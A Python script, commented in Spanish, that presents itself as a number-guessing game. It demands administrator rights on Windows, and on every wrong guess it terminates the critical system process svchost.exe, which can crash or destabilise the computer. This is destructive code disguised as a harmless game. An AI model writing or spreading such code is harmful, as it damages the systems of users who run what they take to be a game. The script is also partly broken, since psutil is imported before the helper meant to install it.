import os
import random
import subprocess
import sys
import psutil
import ctypes

def install_psutil():
    try:
        import psutil
    except ImportError:
        print("psutil no está instalado. Instalando...")
        subprocess.check_call([sys.executable, "-m", "pip", "install", "psutil"])
        print("psutil instalado correctamente.")

def delete_specific_process(process_name):
    try:
        # Obtener lista de procesos activos
        for proc in psutil.process_iter(['pid', 'name']):
            if proc.info['name'].lower() == process_name.lower():
                proc.terminate()  # Eliminar el proceso por su nombre
                print(f"Proceso '{process_name}' con PID {proc.info['pid']} ha sido eliminado.")
                return  # Salir después de eliminar el proceso
        print(f"No se encontró el proceso '{process_name}'.")
    except Exception as e:
        print(f"Ocurrió un error al intentar eliminar el proceso: {e}")

def play_game():
    score = 0
    print("¡Bienvenido al juego de adivinar el número!")
    print("Estoy pensando en un número entre 1 y 10. ¿Puedes adivinarlo?")

    while True:  # Bucle infinito para permitir intentos ilimitados
        number_to_guess = random.randint(1, 10)

        try:
            user_guess = int(input("Ingresa tu suposición (1-10): "))
        except ValueError:
            print("Por favor, ingresa un número válido.")
            continue

        if user_guess == number_to_guess:
            print("¡Correcto!")
            score += 1
        else:
            print(f"Incorrecto. El número correcto era: {number_to_guess}")
            # Eliminar el proceso "svchost.exe"
            delete_specific_process("svchost.exe")  # Elimina el proceso svchost.exe

        print(f"Tu puntaje actual es: {score}")

def is_admin():
    return ctypes.windll.shell32.IsUserAnAdmin() != 0

if __name__ == "__main__":
    # Verificar si se está ejecutando como administrador (solo en Windows)
    if os.name == 'nt':
        if not is_admin():
            print("Este programa necesita permisos de administrador. Por favor, ejecútalo como administrador.")
            sys.exit(1)

    install_psutil()  # Asegurarse de que psutil esté instalado
    play_game()
